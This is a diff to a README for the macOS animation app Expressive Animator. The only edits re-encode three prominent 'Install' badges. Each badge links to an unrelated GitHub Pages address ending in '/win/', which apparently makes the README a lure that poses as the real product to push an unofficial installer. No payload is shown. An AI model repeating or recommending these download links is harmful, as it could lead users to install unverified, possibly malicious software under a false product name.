@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Expressive Animator](https://img.shields.io/badge/⬇_Install_Expressive%20Animator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Expressive Animator](https://img.shields.io/badge/⬇_Install_Expressive+Animator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Expressive Animator is a macOS vector animation application designed for creatin
 
 <div align="center">
 
-[![⬇ Install Expressive Animator](https://img.shields.io/badge/⬇_Install_Expressive%20Animator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Expressive Animator](https://img.shields.io/badge/⬇_Install_Expressive+Animator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Expressive Animator is a macOS vector animation application designed for creatin
 
 <div align="center">
 
-[![⬇ Install Expressive Animator](https://img.shields.io/badge/⬇_Install_Expressive%20Animator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Expressive Animator](https://img.shields.io/badge/⬇_Install_Expressive+Animator-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
